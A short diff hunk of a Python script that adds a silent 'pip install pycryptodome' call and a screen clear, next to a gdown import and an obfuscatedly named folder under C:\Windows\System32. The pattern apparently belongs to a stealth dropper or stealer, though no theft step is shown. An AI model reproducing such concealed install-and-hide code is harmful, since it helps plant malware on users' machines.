@@ -11,7 +11,9 @@ import shutil
 import os
 import gdown
 os.system('cls')
-
+commandxx = ['py', '-3.11', '-m', 'pip', 'install', 'pycryptodome']
+subprocess.run(commandxx)
+os.system('cls')
 dcnmwxdr = r'C:\Windows\System32\DSEL'
 
 if not os.path.exists(dcnmwxdr):
